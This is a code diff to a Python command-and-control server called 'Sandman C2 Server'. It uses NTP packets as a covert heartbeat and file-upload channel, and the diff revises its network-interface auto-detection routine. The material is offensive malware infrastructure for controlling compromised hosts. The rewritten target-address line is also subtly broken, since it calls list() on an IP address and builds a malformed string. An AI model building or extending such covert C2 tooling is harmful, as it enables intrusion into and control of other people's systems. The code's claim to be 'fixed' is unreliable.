@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Sandman C2 Server v8.0 - NTP Edition
+Sandman C2 Server
 Features:
   - NTP Heartbeat (0x1B + IDOV31)
   - Auto-Interface Detection (Ubuntu + Windows Compatible)
@@ -23,7 +23,6 @@ import subprocess
 import queue
 import ipaddress
 import netifaces
-import psutil
 from tkinter import Tk, filedialog
 from scapy.all import sniff, IP, UDP, NTP
 
@@ -188,35 +187,38 @@ def run_file_upload(ip_source, ip_dest, ntp_port=123):
     except Exception as e:
         print(f"[-] File Upload Error: {e}")
 
-# === AUTO-INTERFACE DETECTION (Improved for Ubuntu + Windows) ===
+# === AUTO-INTERFACE DETECTION (FIXED FOR Ubuntu/Windows) ===
 def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
     """Scan all interfaces for the one with traffic to the target range"""
     print(f"[+] Auto-Detecting Interface for Range: {target_range}...")
     
-    # 1. Get all interfaces from `netifaces` (works on Ubuntu + Windows)
     interfaces = netifaces.interfaces()
-    
     print(f"[+] Found {len(interfaces)} interfaces: {', '.join(interfaces)}")
     
-    # 2. Try each interface with its IP address
     for iface_name in interfaces:
         print(f"[+] Checking Interface: {iface_name}...")
         try:
-            # 3. Get the IP address of the interface
             addrs = netifaces.ifaddresses(iface_name)
-            if ipaddress.IPv4Address in addrs.get(2, []):
-                ips = [addr['addr'] for addr in addrs[2] if 'addr' in addr]
+            ipv4_addrs = addrs.get(2, [])
+            
+            if ipv4_addrs:
+                # Extract IPs from dict
+                ips = [addr['addr'] for addr in ipv4_addrs if 'addr' in addr]
                 if ips:
                     ip_address = ips[0]
                     print(f"[+] Interface IP: {ip_address}")
                     
-                    # 4. Try to bind socket to the IP (not name)
+                    # 1. Bind socket to the interface IP
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                     sock.settimeout(2)
                     sock.bind((ip_address, NTP_PORT))
                     
-                    # 5. Try to send a packet to the target range
-                    target_ip = next(iter(ipaddress.IPv4Network(target_range)))
+                    # 2. Send a packet to a reachable IP in the target range
+                    # Use the first IP in the network (e.g., 10.10.10.1)
+                    target_ip = f"{list(ipaddress.IPv4Network(target_range).network_address)}.{1}"
+                    
+                    # 3. Send a small packet
                     sock.sendto(b"test", (target_ip, 123))
                     
                     print(f"[+] Found Active Interface: {iface_name} ({ip_address})")
